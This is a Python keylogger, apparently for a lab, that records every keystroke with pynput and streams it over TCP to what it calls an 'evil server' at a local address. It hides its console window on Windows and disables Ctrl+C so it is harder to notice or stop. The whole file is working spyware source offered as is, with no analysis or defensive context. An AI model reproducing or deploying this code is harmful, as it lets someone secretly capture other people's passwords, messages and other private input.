from pynput import keyboard
import sys
import time
import socket
import threading
import signal
import ctypes

ServerIP = "127.0.0.1"
ServerPort = 32323
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def start_new_thread(f, args):
    t = threading.Thread(target=f, args=args)
    t.start()
    return t

def main():
    global sock

    # Establish TCP socket with the distant server
    try:
        sock.connect((ServerIP, ServerPort))
    except Exception:
        print("Something wrong happened!!!")
        sys.exit(1)

    t2 = start_new_thread(keylog, ())
    t3 = start_new_thread(printMessagesFromEvilServer, ())

    # Send a hello message
    sock.send(b"Hello evil server !")

    # Set up signal handling to ignore Ctrl+C
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    # Hide the terminal window on Windows
    hide_terminal_window()

    # Infinite loop so that the program and thread keeps running
    try:
        while True:
            if not t2.is_alive() or not t3.is_alive():
                sock.close()
                sys.exit(0)
    except KeyboardInterrupt:
        print("\nCtrl+C is disabled in this script.")

# Function to hide the terminal window on Windows
def hide_terminal_window():
    if sys.platform.startswith('win32'):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Thread launched after connection with the evil server is started
# -> it launches the keylogger
def keylog():
    def on_press(key):
        if sock is None:
            sys.exit(0)

        try:
            sock.send(bytes(str(key).encode('utf-8')))
        except Exception as e:
            sys.exit(1)

    # Collect events until released
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def printMessagesFromEvilServer():
    while True:
        if sock is None:
            sys.exit(0)

        data = sock.recv(1024).decode('utf-8')

        if not data:
            sys.exit(0)

        print("[Server] " + data)

main()
